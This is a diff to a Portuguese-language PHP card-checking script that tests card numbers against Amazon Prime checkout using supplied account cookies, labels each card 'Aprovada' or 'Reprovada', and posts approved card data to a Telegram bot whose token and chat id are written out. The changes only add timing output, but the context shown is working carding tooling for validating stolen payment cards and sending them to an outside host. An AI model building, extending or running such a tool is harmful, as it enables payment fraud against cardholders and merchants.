@@ -1,4 +1,6 @@
 <?php
+$start_time = microtime(true);
+
 error_reporting(0);
 header_remove('X-Powered-By');
 header('Cache-Control: no-cache');
@@ -34,7 +36,9 @@ file_put_contents('cookie_log.txt', "[" . date('Y-m-d H:i:s') . "] Cookies receb
 
 // Verificar se há cookies válidos
 if (empty($cookies)) {
-    echo json_encode(["erro" => "true", "response" => time(), "dados" => ["", "", "Erro: Nenhum cookie fornecido"]]);
+    $end_time = microtime(true);
+    $processing_time = number_format($end_time - $start_time, 2);
+    echo json_encode(["erro" => "true", "response" => time(), "dados" => ["", "", "Erro: Nenhum cookie fornecido | Tempo: {$processing_time}s"]]);
     exit;
 }
 
@@ -151,8 +155,10 @@ function bin($cartao) {
 }
 
 if ($separar[2] < date("Y") || ($separar[2] == date("Y") && $mes < (int)date("m"))) {
+    $end_time = microtime(true);
+    $processing_time = number_format($end_time - $start_time, 2);
     $cardInfo = bin($bin);
-    echo json_encode(array("erro" => "true", "response" => time(), "dados" => ["1" => $lista, "2" => "CARD EXPIRADO", "3" => $cardInfo]));
+    echo json_encode(array("erro" => "true", "response" => time(), "dados" => ["1" => $lista, "2" => "CARD EXPIRADO", "3" => $cardInfo . " | Tempo: {$processing_time}s"]));
     header('HTTP/1.1 200 OK');
     exit();
 }
@@ -359,11 +365,14 @@ if ($ativarCookies && $cookies1) {
     $cookie3Ativado = $cookies3 ? ativarCookies($cookies3, $randomUserAgent) : true;
     $cookie4Ativado = $cookies4 ? ativarCookies($cookies4, $randomUserAgent) : true;
 
+    $end_time = microtime(true);
+    $processing_time = number_format($end_time - $start_time, 2);
+
     if ($cookie1Ativado && $cookie2Ativado && $cookie3Ativado && $cookie4Ativado) {
-        echo 'Cookies ativados com sucesso';
+        echo 'Cookies ativados com sucesso | Tempo: ' . $processing_time . 's';
         exit();
     } else {
-        echo 'Falha ao ativar cookies';
+        echo 'Falha ao ativar cookies | Tempo: ' . $processing_time . 's';
         exit();
     }
 }
@@ -996,33 +1005,42 @@ if (is_numeric($cc) && (strlen($cc) == 16 || strlen($cc) == 15)) {
 deletecard($datajson);
 
 if (strpos($mesgirespfim, 'BILLING_ADDRESS_RESTRICTED') !== false || strpos($mesgirespfim, 'Non è stato possibile completare la tua iscrizione a Prime. Ti consigliamo di riprovare durante il proceso di checkout.') !== false) {
-    echo "Aprovada ✅ $lista | Authorised  ";
+    $end_time = microtime(true);
+    $processing_time = number_format($end_time - $start_time, 2);
+    echo "Aprovada $lista | Authorised  usa | Tempo: {$processing_time}s";
     
     // Enviar live aprovada para o bot do Telegram
-$mensagem = urlencode("✅ Live aprovada: $lista"); // substitua pela variável correta
+$mensagem = urlencode("✅ Live aprovada: $lista | Tempo: {$processing_time}s"); // substitua pela variável correta
 file_get_contents("https://api.telegram.org/bot7748457693:AAHGW30nEHdbGBI6pCZNdQPzCUgUPiUfO4k/sendMessage?chat_id=-1002804633645&text={$mensagem}");
     exit();
 } else if (strpos($mesgirespfim, 'InvalidInput') !== false) {
-    echo "❌Reprovada $lista | PAGAMENTO RECUSADO  🇺🇸";
+    $end_time = microtime(true);
+    $processing_time = number_format($end_time - $start_time, 2);
+    echo "Reprovada $lista | PAGAMENTO RECUSADO  usa | Tempo: {$processing_time}s";
     exit();
 } else if (strpos($mesgirespfim, 'HARDVET_VERIFICATION_FAILED') !== false || strpos($mesgirespfim, 'hardVet') !== false || strpos($mesgirespfim, "HARDVET_VERIFICATION_FAILED") !== false) {
-    echo "❌Reprovada $lista | PAGAMENTO RECUSADO  🇺🇸";
+    $end_time = microtime(true);
+    $processing_time = number_format($end_time - $start_time, 2);
+    echo "Reprovada $lista | PAGAMENTO RECUSADO  usa | Tempo: {$processing_time}s";
     exit();
 } elseif (strpos($mesgirespfim, 'There was an error validating your payment method') !== false || strpos($mesgirespfim, "There was an error validating your payment method. Please update or add a new payment method and try again") !== false) {
-    echo "❌Reprovada $lista | ERRO NA VALIDAÇÃO DO MÉTODO DE PAGAMENTO  🇺🇸";
+    $end_time = microtime(true);
+    $processing_time = number_format($end_time - $start_time, 2);
+    echo "Reprovada $lista | ERRO NA VALIDAÇÃO DO MÉTODO DE PAGAMENTO  usa | Tempo: {$processing_time}s";
     exit();
 } else {
-      echo "<font color='white'>❌Reprovada -> $lista | Retorno:<font color='red'> VERIFIQUE O SEUS COOKIES, COOKIES RUIM</font>";
+    $end_time = microtime(true);
+    $processing_time = number_format($end_time - $start_time, 2);
+      echo "<font color='white'>Reprovada -> $lista | Retorno:<font color='red'> VERIFIQUE O SEUS COOKIES, COOKIES RUIM</font> | Tempo: {$processing_time}s";
       header('HTTP/1.1 200 OK');
       exit();
 }
 } else {
+    $end_time = microtime(true);
+    $processing_time = number_format($end_time - $start_time, 2);
     $cardInfo = bin($bin);
-    echo "❌Reprovada $lista | CARTÃO INVÁLIDO  🇺🇸";
+    echo "Reprovada $lista | CARTÃO INVÁLIDO  usa | Tempo: {$processing_time}s";
     header('HTTP/1.1 200 OK');
     exit();
 }
-
 ?>
-
-
